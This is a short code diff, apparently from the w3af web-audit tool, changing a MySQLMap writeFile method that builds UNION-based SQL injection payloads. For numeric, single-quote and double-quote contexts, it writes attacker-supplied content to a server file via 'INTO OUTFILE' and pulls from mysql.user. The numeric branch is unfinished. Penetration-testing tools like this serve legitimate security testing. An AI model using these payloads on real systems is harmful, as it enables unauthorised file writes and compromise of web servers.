@@ -497,8 +497,17 @@ class MySQLMap(Common):
         union = self.unionCheck()
         # union = http://localhost/w3af/blindSqli/blindSqli-integer.php?id=1 UNION SELECT NULL, NULL, NULL, NULL, NULL
         
-        union.replace( 'NULL', content, 1 )
-        union += ' FROM mysql.user LIMIT 1 INTO OUTFILE "%s" /*' % filename
+        if self.args.injectionMethod == "numeric":
+            # FIXME: How to handle this case ?!
+            union += ' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' /*' % filename
+            print 'Please contribute! mysqlmap.py : writeFile method.'
+            raise NotImplemented
+        elif self.args.injectionMethod == "stringsingle":
+            union = union.replace( "'1", "'"+content, 1 )
+            union += '\' FROM mysql.user LIMIT 1 INTO OUTFILE \'%s\' /*' % filename
+        elif self.args.injectionMethod == "stringdouble":
+            union = union.replace( '"1', '"'+content, 1 )
+            union += '" FROM mysql.user LIMIT 1 INTO OUTFILE "%s" /*' % filename
         
         self.getPage( union )
         
